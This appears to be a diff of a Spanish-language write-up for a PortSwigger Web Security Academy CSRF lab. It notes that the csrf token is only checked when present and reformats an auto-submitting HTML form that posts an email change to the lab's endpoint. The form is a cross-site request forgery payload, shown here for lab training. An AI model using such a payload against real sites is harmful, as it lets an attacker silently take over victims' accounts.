@@ -16,5 +16,11 @@ ok. parece que el parámetro `csrf` solo tiene una validación si este se encuen
 
 ```python
 `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
-<input type="hidden" name="$param1name" value="$param1value"> </form> <script> document.forms[0].submit(); </script>`
+	<input type="hidden" name="$param1name" value="$param1value"> 
+</form> 
+<script> 
+	document.forms[0].submit(); 
+	</script>`
 ```
+
+usando la platilla porporcionada o usando uno de los metodos que podemos encontrar en internet y que les proporcione anteriormente podemos crear unas
